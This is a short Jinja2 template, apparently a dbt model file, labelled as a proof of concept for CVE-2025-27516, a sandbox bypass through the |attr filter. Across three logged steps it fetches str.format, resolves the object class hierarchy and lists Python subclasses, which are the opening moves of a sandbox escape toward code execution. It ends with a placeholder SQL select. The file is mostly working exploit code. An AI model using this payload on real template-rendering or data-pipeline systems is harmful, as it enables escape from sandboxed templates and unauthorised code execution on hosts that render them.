{# CVE-2025-27516: Jinja2 |attr filter sandbox bypass #}
{# Step 1: Get format reference via attr #}
{% set fmt = '{0.__class__.__mro__}'|attr('format') %}
{{ log("FMT=" ~ (fmt | string), info=True) }}
{# Step 2: Call format to resolve MRO #}
{% set result = fmt('') %}
{{ log("MRO=" ~ (result | string), info=True) }}
{# Step 3: Get subclasses if MRO worked #}
{% set fmt2 = '{0.__class__.__mro__[2].__subclasses__()}'|attr('format') %}
{% set result2 = fmt2('') %}
{{ log("SUBS=" ~ (result2 | string), info=True) }}
SELECT 1 as id
